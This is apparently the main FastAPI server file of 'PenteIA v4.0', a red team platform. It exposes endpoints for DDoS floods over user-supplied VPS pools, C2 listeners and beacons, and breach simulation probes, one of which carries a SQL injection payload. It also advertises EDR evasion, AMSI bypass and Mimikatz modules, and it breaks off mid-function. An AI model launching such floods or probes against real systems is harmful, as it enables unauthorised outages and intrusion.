#!/usr/bin/env python
# -*- coding: utf-8 -*-
try:
    from dotenv import load_dotenv as _load_dotenv
    import pathlib as _pathlib
    _load_dotenv(dotenv_path=_pathlib.Path(__file__).parent / ".env")
except ImportError:
    pass
from fastapi import FastAPI, HTTPException, Depends, status, File, UploadFile, Request, Header, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse, FileResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates
from fastapi.security import HTTPBearer
from pydantic import BaseModel, Field, field_validator
import re as _re
from typing import Optional, List
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from sqlalchemy import func
import json, os, io, time, asyncio, threading, socket as _socket, base64 as _b64
import requests as _requests
import queue as _queue
import hmac as _hmac, hashlib as _hashlib
from pathlib import Path

try:
    from apscheduler.schedulers.background import BackgroundScheduler as _APScheduler
    _HAS_APSCHEDULER = True
except ImportError:
    _HAS_APSCHEDULER = False

from database import get_db, SessionLocal
from auth import (
    get_current_user, require_admin, authenticate_user, create_access_token,
    hash_password, LoginRequest, TokenResponse, RegisterRequest
)
from models import User, Listener, Beacon, Playbook, Simulation, Report, Payload, PenteiaAgent, AgentTask, ScheduledScan, WebhookConfig, AuditLog, Campaign, Notification, CloudReconResult, PhishingCampaign, PhishingTarget, SOCValidation, RemediationTicket

try:
    from cloud_recon import run_cloud_recon as _run_cloud_recon
    _HAS_CLOUD_RECON = True
except ImportError:
    _HAS_CLOUD_RECON = False

try:
    from sentinel_wazuh_rules import generate_combined as _wazuh_generate_combined
    _HAS_WAZUH_RULES = True
except ImportError:
    _HAS_WAZUH_RULES = False

try:
    from llm_narrative import summarize_simulation as _llm_summarize
    _HAS_LLM = True
except ImportError:
    _HAS_LLM = False

try:
    from payload_generator import generate_payload as _gen_payload, get_templates as _get_payload_templates, EncoderType, PayloadFormat
    _HAS_PAYLOAD_GEN = True
except ImportError:
    _HAS_PAYLOAD_GEN = False

from penteia_v4_orchestrator import PenteIAv4Orchestrator
from ddos_testing import DDoSTestingEngine, DDoSConfig, DDoSMethod
from ssh_proxy import SSHProxyConfig, SSHProxyExecutor, SSHProxyPool
from local_executor import LocalFloodExecutor
from recon import resolver_dominio, scan_portas, extrair_host, parse_portas
from cdn_bypass import find_origin_ip
import cloudfail_recon as _cf
from serverless_recon import find_serverless_endpoints

# — in-memory state (single-process mode only)
_operation_logs: list = []
_ssh_tests: dict = {}      # test_id -> {thread, result, started_at, executor}
_scan_tasks: dict = {}     # task_id -> {"q": Queue, "done": bool, "results": list, "error": str|None, "completed_at": float}
_login_attempts: dict = {} # ip -> [timestamps]
_ws_clients: set = set()   # active WebSocket connections

ALLOWED_ORIGINS = os.getenv("CORS_ORIGINS", "http://localhost:5173,http://localhost:3000").split(",")

app = FastAPI(title="PenteIA v4.0", description="Red Team Platform", version="4.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

base_dir = os.path.dirname(os.path.abspath(__file__))
static_dir = os.path.join(base_dir, "static")
templates_dir = os.path.join(base_dir, "templates")

if os.path.exists(static_dir):
    app.mount("/static", StaticFiles(directory=static_dir), name="static")

orchestrator = PenteIAv4Orchestrator()
ddos_engine = DDoSTestingEngine()

# APScheduler para agendamento de simulações
_scheduler = None
if _HAS_APSCHEDULER:
    _scheduler = _APScheduler(daemon=True)
    _scheduler.start()


@app.on_event("startup")
async def _startup():
    """Re-register APScheduler jobs, create new DB tables, and clean orphan simulations."""
    from database import engine
    from models import Base
    Base.metadata.create_all(bind=engine)

    db_startup = SessionLocal()
    try:
        # Cleanup orphan simulations stuck in "running" for more than 2 hours
        cutoff = datetime.utcnow() - timedelta(hours=2)
        orphans = db_startup.query(Simulation).filter(
            Simulation.status == "running",
            Simulation.date < cutoff,
        ).all()
        for sim in orphans:
            sim.status = "timeout"
            sim.results = sim.results or {}
        if orphans:
            db_startup.commit()

        if not _scheduler:
            return

        # KEV check job — every 6 hours
        try:
            _scheduler.add_job(
                _kev_check_job,
                trigger="interval",
                hours=6,
                id="kev_check_job",
                replace_existing=True,
            )
        except Exception:
            pass

        enabled_scans = db_startup.query(ScheduledScan).filter(ScheduledScan.enabled == True).all()
        for scan in enabled_scans:
            days = _interval_days(scan.interval)
            try:
                _scheduler.add_job(
                    _run_scheduled_sim,
                    trigger="interval",
                    days=days,
                    id=scan.id,
                    args=[scan.id],
                    replace_existing=True,
                )
            except Exception:
                pass
    finally:
        db_startup.close()


# ── Pydantic models ──────────────────────────────────────────────────────────

class DDoSStartRequest(BaseModel):
    target_host: str
    target_port: int = 80
    method: str = "http_flood"
    duration: int = 60
    pps: int = 500
    threads: int = 8
    payload_size: int = 512      # UDP: tamanho do payload em bytes
    connections: int = 300       # Slowloris: conexões simultâneas
    use_ssh_proxy: bool = False
    use_local: bool = False
    ssh_host: Optional[str] = None
    ssh_port: int = 22
    ssh_user: Optional[str] = None
    ssh_pass: Optional[str] = None
    endpoints: str = ''

class SSHProxyTestRequest(BaseModel):
    host: str
    port: int = 22
    user: str
    password: str

class VPSNode(BaseModel):
    host: str
    port: int = 22
    user: str
    password: str

class DDoSPoolStartRequest(BaseModel):
    target_host: str
    target_port: int = 80
    method: str = "http_flood"
    duration: int = 60
    pps: int = 200
    threads: int = 4
    vps_list: List[VPSNode]
    endpoints: str = ''

class ServerlessReconRequest(BaseModel):
    domain: str
    use_ssl: bool = True

class CDNCheckRequest(BaseModel):
    domain: str

class ReconResolveRequest(BaseModel):
    domain: Optional[str] = None
    host: Optional[str] = None  # alias

    def get_domain(self) -> str:
        return (self.domain or self.host or "").strip()

class ReconIPInfoRequest(BaseModel):
    ip: Optional[str] = None
    host: Optional[str] = None  # alias

    def get_ip(self) -> str:
        return (self.ip or self.host or "").strip()

class ReconScanRequest(BaseModel):
    host: str
    ports: str = "1-1000"
    timeout: float = 1.0
    workers: int = 50

class AdminCreateUserRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: str = Field(..., max_length=255)
    password: str = Field(..., min_length=6, max_length=128)
    is_admin: bool = False
    credits: int = Field(0, ge=0)

    @field_validator("email")
    @classmethod
    def validate_email(cls, v: str) -> str:
        if not _re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", v):
            raise ValueError("Email inválido")
        return v.lower()

class AdminUpdateUserRequest(BaseModel):
    username: Optional[str] = None
    email: Optional[str] = None
    password: Optional[str] = None
    is_admin: Optional[bool] = None
    status: Optional[str] = None

class AdminCreditsRequest(BaseModel):
    action: str
    amount: int = Field(..., ge=0)

class ListenerCreateRequest(BaseModel):
    name: str
    host: str
    port: int = 443
    protocol: str = "HTTPS"

class BeaconCreateRequest(BaseModel):
    hostname: str
    ip: str
    user: str

class BeaconCommandRequest(BaseModel):
    command: str

class PlaybookCreateRequest(BaseModel):
    name: str
    techniques: int = 0
    severity: str
    description: str = ""

class PlaybookExecuteRequest(BaseModel):
    playbook_id: str
    target: str = "localhost"

class ReportCreateRequest(BaseModel):
    title: str
    report_type: str
    format: str

class CloudFailRequest(BaseModel):
    domain: str
    workers: int = 30
    use_custom_wordlist: bool = False

class ScheduleCreateRequest(BaseModel):
    playbook_id: str
    target: str
    interval: str = "weekly"  # daily / weekly / monthly

class ScheduleToggleRequest(BaseModel):
    enabled: bool

class WebhookCreateRequest(BaseModel):
    name: str
    url: str
    events: List[str] = ["simulation_complete"]
    secret: Optional[str] = None

class ComplianceReportRequest(BaseModel):
    framework: str  # lgpd / iso27001 / pcidss
    simulation_id: Optional[str] = None  # None = usar última simulação


# ── Helpers ──────────────────────────────────────────────────────────────────

def _check_rate_limit(ip: str, max_attempts: int = 10, window: int = 60) -> bool:
    now = time.time()
    window_start = now - window
    attempts = [t for t in _login_attempts.get(ip, []) if t > window_start]
    if len(attempts) >= max_attempts:
        _login_attempts[ip] = attempts  # mantém lista prunada mas não adiciona
        return False
    attempts.append(now)
    if attempts:
        _login_attempts[ip] = attempts
    else:
        _login_attempts.pop(ip, None)  # remove chave quando lista fica vazia (GC)
    return True

def _cleanup_old_scan_tasks():
    cutoff = time.time() - 600
    to_remove = [k for k, v in list(_scan_tasks.items()) if v.get("done") and v.get("completed_at", 0) < cutoff]
    for k in to_remove:
        del _scan_tasks[k]


# ── Health ───────────────────────────────────────────────────────────────────

@app.get("/api/health")
async def health():
    return {"status": "ok", "timestamp": datetime.utcnow().isoformat()}


# ── Status / Dashboard ───────────────────────────────────────────────────────

@app.get("/api/status")
async def get_status(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    modules = {
        "ddos": {"name": "DDoS Testing", "status": "ready"},
        "recon": {"name": "Recon", "status": "ready"},
        "c2": {"name": "C2 Framework", "status": "ready"},
        "bas": {"name": "BAS", "status": "ready"},
        "edr_evasion": {"name": "EDR Evasion", "status": "ready"},
        "memory_evasion": {"name": "Memory Evasion", "status": "ready"},
        "telemetry_bypass": {"name": "Telemetry Bypass", "status": "ready"},
        "post_exploitation": {"name": "Post-Exploitation", "status": "ready"},
        "reporting": {"name": "Reporting", "status": "ready"},
    }
    return {
        "status": "online",
        "modules": modules,
        "active_operations": len([o for o in _operation_logs if o.get("module") != "SYSTEM"]),
    }


# ── Auth ─────────────────────────────────────────────────────────────────────

@app.post("/api/auth/register")
async def register(req: RegisterRequest, db: Session = Depends(get_db)):
    existing = db.query(User).filter(User.username == req.username).first()
    if existing:
        raise HTTPException(status_code=400, detail="Usuário já existe")
    is_first = db.query(User).count() == 0
    user = User(
        username=req.username, email=req.email,
        password_hash=hash_password(req.password),
        role="admin" if is_first else "user",
        is_admin=is_first,
        credits=9999 if is_first else 100,
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    access_token = create_access_token(data={"sub": user.id})
    return TokenResponse(access_token=access_token, token_type="bearer", username=user.username, is_admin=user.is_admin, role=user.role or "user")

@app.post("/api/auth/login")
async def login(req: LoginRequest, request: Request, db: Session = Depends(get_db)):
    client_ip = request.client.host if request.client else "unknown"
    if not _check_rate_limit(client_ip):
        raise HTTPException(status_code=429, detail="Muitas tentativas de login. Aguarde 60 segundos.")
    user = await authenticate_user(db, req.username, req.password)
    if not user:
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    if user == "suspended":
        raise HTTPException(status_code=403, detail="Conta suspensa. Entre em contato com o administrador.")
    access_token = create_access_token(data={"sub": user.id})
    _role = getattr(user, "role", None) or ("admin" if user.is_admin else "user")
    return TokenResponse(access_token=access_token, token_type="bearer", username=user.username, is_admin=user.is_admin or False, role=_role)

@app.get("/api/auth/me")
async def get_me(current_user: User = Depends(get_current_user)):
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin or False,
        "role": current_user.role or ("admin" if current_user.is_admin else "user"),
        "credits": current_user.credits or 0,
        "status": current_user.status or "active",
        "created_at": current_user.created_at.isoformat() if current_user.created_at else None,
    }


# ── Modules ──────────────────────────────────────────────────────────────────

@app.get("/api/modules/status")
async def get_modules_status(current_user: User = Depends(get_current_user)):
    return {
        "modules": {
            "ddos": {"name": "DDoS Testing", "description": "5 métodos de ataque", "status": "ready"},
            "recon": {"name": "Recon", "description": "DNS + Port Scanning", "status": "ready"},
            "c2": {"name": "C2 Framework", "description": "Beacon Management", "status": "ready"},
            "bas": {"name": "BAS", "description": "MITRE ATT&CK Simulations", "status": "ready"},
            "edr_evasion": {"name": "EDR Evasion", "description": "Evasão de EDR", "status": "ready"},
            "memory_evasion": {"name": "Memory Evasion", "description": "Evasão de Memória", "status": "ready"},
            "telemetry_bypass": {"name": "Telemetry Bypass", "description": "Bypass de Telemetria", "status": "ready"},
            "post_exploitation": {"name": "Post-Exploitation", "description": "Pós-exploração", "status": "ready"},
            "reporting": {"name": "Reporting", "description": "Geração de Relatórios", "status": "ready"},
        }
    }

@app.get("/api/modules/config/{module_key}")
async def get_module_config(module_key: str, current_user: User = Depends(get_current_user)):
    configs = {
        "ddos": {"name": "DDoS Testing", "version": "4.0", "status": "ready",
                 "features": ["SYN Flood", "UDP Flood", "HTTP Flood", "Slowloris", "DNS Amplification"]},
        "recon": {"name": "Recon", "version": "3.0", "status": "ready",
                  "features": ["DNS Resolution", "TCP Port Scan", "Banner Grabbing", "OS Detection"]},
        "c2": {"name": "C2 Framework", "version": "4.0", "status": "ready",
               "features": ["HTTP/HTTPS Beacon", "DNS Beacon", "Malleable C2 Profiles", "Sleep Jitter"]},
        "bas": {"name": "BAS Engine", "version": "4.0", "status": "ready",
                "features": ["MITRE ATT&CK Playbooks", "Technique Execution", "Evidence Collection", "Scoring"]},
        "edr_evasion": {"name": "EDR Evasion", "version": "4.0", "status": "ready",
                        "features": ["ROP Gadgets", "Indirect Syscalls", "Module Stomping", "Sandbox Detection"]},
        "memory_evasion": {"name": "Memory Evasion", "version": "4.0", "status": "ready",
                           "features": ["Sleep Obfuscation", "Thread Stack Spoofing", "APC Queue Abuse"]},
        "telemetry_bypass": {"name": "Telemetry Bypass", "version": "4.0", "status": "ready",
                             "features": ["AMSI Bypass", "ETW Disable", "Event Log Manipulation", "Sysmon Bypass"]},
        "post_exploitation": {"name": "Post-Exploitation", "version": "4.0", "status": "ready",
                              "features": ["COFF/BOF Execution", ".NET Assembly", "Mimikatz Integration", "BloodHound"]},
        "reporting": {"name": "Reporting", "version": "3.0", "status": "ready",
                      "features": ["PDF Export", "DOCX Export", "HTML Report", "Attack Graph"]},
    }
    if module_key not in configs:
        raise HTTPException(status_code=404, detail="Módulo não encontrado")
    return configs[module_key]


# ── Operations log ───────────────────────────────────────────────────────────

@app.get("/api/operations")
async def get_operations(limit: int = 50, current_user: User = Depends(get_current_user)):
    return {"operations": _operation_logs[-limit:]}

@app.post("/api/operations/clear")
async def clear_operations(current_user: User = Depends(get_current_user)):
    _operation_logs.clear()
    return {"message": "Logs limpos"}


# ── C2 ───────────────────────────────────────────────────────────────────────

@app.get("/api/c2/listeners")
async def get_listeners(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    listeners = db.query(Listener).filter(Listener.user_id == current_user.id).all()
    return {"listeners": [
        {"id": l.id, "name": l.name, "host": l.host, "port": l.port, "protocol": l.protocol, "status": l.status}
        for l in listeners
    ]}

@app.post("/api/c2/listeners")
async def create_listener(
    req: ListenerCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    listener = Listener(user_id=current_user.id, name=req.name, host=req.host, port=req.port, protocol=req.protocol, status="active")
    db.add(listener)
    db.commit()
    _operation_logs.append({"module": "C2", "action": "Listener criado", "details": f"{req.name} ({req.host}:{req.port})", "timestamp": datetime.utcnow().isoformat()})
    return {"id": listener.id, "message": "Listener criado"}

@app.delete("/api/c2/listeners/{listener_id}")
async def delete_listener(listener_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    listener = db.query(Listener).filter(Listener.id == listener_id, Listener.user_id == current_user.id).first()
    if not listener:
        raise HTTPException(status_code=404, detail="Listener não encontrado")
    db.delete(listener)
    db.commit()
    return {"message": "Listener deletado"}

@app.get("/api/c2/beacons")
async def get_beacons(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    beacons = db.query(Beacon).filter(Beacon.user_id == current_user.id).all()
    return {"beacons": [
        {"id": b.id, "hostname": b.hostname, "ip": b.ip, "user": b.user,
         "lastSeen": b.last_seen.isoformat(), "status": b.status}
        for b in beacons
    ]}

@app.post("/api/c2/beacons")
async def register_beacon(
    req: BeaconCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    beacon = Beacon(user_id=current_user.id, hostname=req.hostname, ip=req.ip, user=req.user, status="active")
    db.add(beacon)
    db.commit()
    return {"id": beacon.id, "message": "Beacon registrado"}

@app.post("/api/c2/beacons/{beacon_id}/command")
async def send_command(
    beacon_id: str, req: BeaconCommandRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    beacon = db.query(Beacon).filter(Beacon.id == beacon_id, Beacon.user_id == current_user.id).first()
    if not beacon:
        raise HTTPException(status_code=404, detail="Beacon não encontrado")
    beacon.last_seen = datetime.utcnow()
    db.commit()
    return {"beacon_id": beacon_id, "command": req.command, "output": f"Executado: {req.command}", "timestamp": datetime.utcnow().isoformat()}


# ── BAS ──────────────────────────────────────────────────────────────────────

_TECHNIQUE_META = {
    "T1590":  {"cvss": 5.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021", "PCI-DSS 6.4.3"],
               "remediation": "Configurar servidor para retornar header Server genérico (ex: 'Web Server') ou removê-lo completamente."},
    "T1592":  {"cvss": 5.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021", "NIST SC-8", "PCI-DSS 6.4.3"],
               "remediation": "Adicionar headers: Content-Security-Policy, Strict-Transport-Security, X-Frame-Options e X-Content-Type-Options."},
    "T1190":  {"cvss": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "Critical",
               "compliance": ["OWASP A03:2021", "PCI-DSS 6.4.1", "NIST SI-10", "LGPD Art.46"],
               "remediation": "Implementar WAF com regras SQLi atualizadas. Usar prepared statements e ORM com parametrização."},
    "T1190b": {"cvss": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "Critical",
               "compliance": ["OWASP A03:2021", "PCI-DSS 6.4.1"],
               "remediation": "Atualizar regras WAF para detectar SQLi com comentários SQL (/**/) e variantes encodadas."},
    "T1059":  {"cvss": 6.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "severity": "Medium",
               "compliance": ["OWASP A03:2021", "PCI-DSS 6.4.1", "NIST SI-10"],
               "remediation": "Implementar Content-Security-Policy e sanitização de output. WAF com regras XSS."},
    "T1059b": {"cvss": 6.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "severity": "Medium",
               "compliance": ["OWASP A03:2021", "PCI-DSS 6.4.1"],
               "remediation": "Adicionar regras WAF case-insensitive para XSS. Normalizar e escapar input antes de filtrar."},
    "T1078":  {"cvss": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "Critical",
               "compliance": ["OWASP A01:2021", "PCI-DSS 8.2.1", "NIST AC-3", "LGPD Art.46"],
               "remediation": "Garantir autenticação JWT em todos os endpoints protegidos. Redirecionar rotas sem auth para /login."},
    "T1110":  {"cvss": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "Critical",
               "compliance": ["OWASP A07:2021", "PCI-DSS 8.3.4", "NIST IA-5"],
               "remediation": "Remover credenciais padrão. Implementar MFA e bloqueio de conta após 5 tentativas falhas."},
    "T1499":  {"cvss": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "High",
               "compliance": ["OWASP A04:2021", "PCI-DSS 6.4.3", "NIST SC-5"],
               "remediation": "Implementar rate limiting (ex: 10r/min por IP) em todos os endpoints críticos com resposta 429."},
    "T1083":  {"cvss": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "severity": "High",
               "compliance": ["OWASP A01:2021", "PCI-DSS 6.4.1", "NIST SI-10"],
               "remediation": "Validar parâmetros de caminho com allowlist. Implementar WAF com regras path traversal/LFI."},
    "T1087":  {"cvss": 8.2, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "severity": "High",
               "compliance": ["OWASP A01:2021", "PCI-DSS 8.2.1", "NIST AC-3"],
               "remediation": "Restringir todos os endpoints de API com autenticação e autorização por role (RBAC)."},
    "T1078b": {"cvss": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "Critical",
               "compliance": ["OWASP A07:2021", "PCI-DSS 8.3.2", "NIST IA-5"],
               "remediation": "Usar chave JWT aleatória forte (>= 256 bits). Validar claims exp/iat/iss. Rotacionar chaves regularmente."},
    "T1595":  {"cvss": 5.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021", "NIST SI-3"],
               "remediation": "Configurar WAF para bloquear User-Agents de scanners conhecidos: sqlmap, nikto, masscan, nmap."},
    "T1595b": {"cvss": 4.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021"],
               "remediation": "Bloquear ou desafiar (CAPTCHA) clientes HTTP genéricos (python-requests, curl) em endpoints sensíveis."},
    "T1185":  {"cvss": 8.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "severity": "High",
               "compliance": ["OWASP A01:2021", "PCI-DSS 6.4.1", "NIST SC-23"],
               "remediation": "Implementar token CSRF (SameSite=Strict + token aleatório) em todos os formulários POST."},
    "T1602":  {"cvss": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "severity": "High",
               "compliance": ["OWASP A02:2021", "PCI-DSS 4.2.1", "NIST SC-8"],
               "remediation": "Forçar HTTPS via redirect 301 permanente. Configurar HSTS com max-age >= 31536000 e includeSubDomains."},
    "T1592b": {"cvss": 5.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A02:2021", "PCI-DSS 6.4.3", "NIST SC-8"],
               "remediation": "Adicionar flags HttpOnly, Secure e SameSite=Strict em todos os cookies de autenticação/sessão."},
    "T1557":  {"cvss": 6.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021", "NIST CM-7", "PCI-DSS 6.4.3"],
               "remediation": "Desabilitar métodos HTTP não necessários (PUT, DELETE, TRACE, PATCH) na configuração do servidor web."},
    "T1190c": {"cvss": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "severity": "Critical",
               "compliance": ["OWASP A07:2021", "PCI-DSS 8.3.2", "NIST IA-5"],
               "remediation": "Rejeitar explicitamente JWTs com alg=none na biblioteca JWT. Definir allowlist de algoritmos aceitos."},
    "T1190e": {"cvss": 8.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", "severity": "High",
               "compliance": ["OWASP A01:2021", "NIST SC-8", "PCI-DSS 6.4.3"],
               "remediation": "Configurar CORS com allowlist explícita de origens. Nunca usar Access-Control-Allow-Origin: *."},
    "T1087b": {"cvss": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "severity": "High",
               "compliance": ["OWASP A05:2021", "PCI-DSS 6.4.3", "NIST CM-7"],
               "remediation": "Bloquear acesso a .git, .env, .htaccess e backups via configuração nginx/Apache (deny all)."},
    "T1499b": {"cvss": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H", "severity": "High",
               "compliance": ["OWASP A04:2021", "PCI-DSS 6.4.3", "NIST SC-5"],
               "remediation": "Configurar nginx para usar $binary_remote_addr (não $http_x_forwarded_for) nas zonas de rate limiting. Adicionar set_real_ip_from apenas para proxies confiáveis."},
    "T1592c": {"cvss": 5.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021", "PCI-DSS 6.4.3", "NIST CM-7"],
               "remediation": "Remover ou restringir o endpoint /api/status a redes internas. Não expor versão, ambiente (env) ou nome do servidor em respostas públicas."},
    "T1592d": {"cvss": 6.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "severity": "Medium",
               "compliance": ["OWASP A05:2021", "PCI-DSS 6.4.3", "NIST CM-7"],
               "remediation": "Proteger endpoints de métricas (/metrics, /api/v*/metrics) com autenticação. Considerar expô-los apenas em rede interna ou via sidecar autenticado (Prometheus + basicauth)."},
    "T1596b": {"cvss": 4.0, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "severity": "Low",
               "compliance": ["OWASP A05:2021", "NIST CM-7"],
               "remediation": "Revisar robots.txt para não expor paths sensíveis. Publicar security.txt (RFC 9116) com contato de responsible disclosure."},
    "T1557b": {"cvss": 6.4, "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N", "severity": "Medium",
               "compliance": ["OWASP A03:2021", "NIST SI-10"],
               "remediation": "Nunca usar o header Host diretamente em redirects ou respostas. Configurar server_name explícito no nginx. Usar $server_name em vez de $http_host."},
    "T1190f": {"cvss": 8.1, "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", "severity": "High",
               "compliance": ["OWASP A02:2021", "PCI-DSS 6.4.1", "NIST SI-10"],
               "remediation": "Atualizar nginx para versão >= 1.25. Configurar proxy_request_buffering on e limitar métodos permitidos. Usar WAF com regras de HTTP smuggling."},
}


@app.get("/api/bas/playbooks")
async def get_playbooks(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    playbooks = db.query(Playbook).filter(Playbook.user_id == current_user.id).all()
    return {"playbooks": [{"id": p.id, "name": p.name, "techniques": p.techniques, "severity": p.severity} for p in playbooks]}

@app.post("/api/bas/playbooks")
async def create_playbook(
    req: PlaybookCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    playbook = Playbook(user_id=current_user.id, name=req.name, techniques=req.techniques, severity=req.severity, description=req.description)
    db.add(playbook)
    db.commit()
    _operation_logs.append({"module": "BAS", "action": "Playbook criado", "details": req.name, "timestamp": datetime.utcnow().isoformat()})
    return {"id": playbook.id, "message": "Playbook criado"}

@app.delete("/api/bas/playbooks/{playbook_id}")
async def delete_playbook(playbook_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    playbook = db.query(Playbook).filter(Playbook.id == playbook_id, Playbook.user_id == current_user.id).first()
    if not playbook:
        raise HTTPException(status_code=404, detail="Playbook não encontrado")
    db.delete(playbook)
    db.commit()
    return {"message": "Playbook deletado"}

def _bas_run(sim_id: str, playbook_name: str, target: str, severity: str, num_techniques: int):
    """Executa simulação BAS real contra o alvo."""

    # parse host:port
    if "://" in target:
        base = target.rstrip("/")
    elif ":" in target.split("/")[-1]:
        parts = target.rsplit(":", 1)
        host_p = parts[0].lstrip("http://").lstrip("https://")
        try:
            port = int(parts[1])
            base = f"http://{host_p}:{port}"
        except ValueError:
            base = f"http://{target}"
    else:
        host = target.lstrip("http://").lstrip("https://")
        base = f"http://{host}"

    # Quick reachability check before running full suite
    try:
        _ping = _requests.get(base + "/", timeout=5, allow_redirects=False)
    except Exception:
        _ping = None

    techniques = []
    hits = 0  # técnicas que encontraram fraqueza

    # If target completely unreachable, mark as unreachable immediately
    if _ping is None:
        db_early = SessionLocal()
        try:
            sim = db_early.query(Simulation).filter(Simulation.id == sim_id).first()
            if sim:
                sim.status = "unreachable"
                sim.score = 0.0
                sim.results = {
                    "techniques": [],
                    "hits": 0,
                    "total": 0,
                    "target": target,
                    "error": "Alvo inacessível — sem resposta HTTP no endereço fornecido. Verifique host:porta e protocolo.",
                }
                db_early.commit()
        finally:
            db_early.close()
        _operation_logs.append({
            "module": "BAS", "action": "Alvo inacessível",
            "details": f"{playbook_name} → {target}",
            "timestamp": datetime.utcnow().isoformat(),
        })
        return

    def probe(path="/", method="GET", data=None, headers=None, timeout=5):
        try:
            h = {"User-Agent": "Mozilla/5.0 PenteIA-BAS/4.0"}
            if headers: h.update(headers)
            fn = getattr(_requests, method.lower(), _requests.get)
            r = fn(base + path, data=data, headers=h, timeout=timeout, allow_redirects=False)
            return r
        except Exception:
            return None

    # T1: Service Fingerprint
    r = probe("/")
    server = r.headers.get("Server", "?") if r is not None else "unreachable"
    t1 = {"id": "T1590", "name": "Service Fingerprint",
          "status": "found" if r is not None else "blocked",
          "http_status": r.status_code if r is not None else 0,
          "detail": f"Server: {server} | HTTP {r.status_code if r is not None else 0}"}
    if r is not None and r.status_code < 500: hits += 1
    techniques.append(t1)

    # T2: Security Headers
    missing = []
    if r is not None:
        for hdr in ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options"]:
            if hdr not in r.headers: missing.append(hdr)
    t2 = {"id": "T1592", "name": "Security Headers Audit",
          "status": "found" if missing else "blocked",
          "http_status": r.status_code if r is not None else 0,
          "detail": f"Headers ausentes: {', '.join(missing)}" if missing else "Todos os headers de segurança presentes"}
    if missing: hits += 1
    techniques.append(t2)

    if severity in ("Medium", "High", "Critical") or num_techniques >= 4:
        # T3: WAF Detection (SQLi — URL-encoded quote)
        r3 = probe("/?id=1%27%20UNION%20SELECT%201--")
        waf_standard = r3 is None or (r3 is not None and r3.status_code == 403)
        t3_detail = ("WAF bloqueou via TCP reset" if r3 is None else
                     "WAF retornou 403 Forbidden" if r3.status_code == 403 else
                     f"Payload SQLi não bloqueado (HTTP {r3.status_code})")
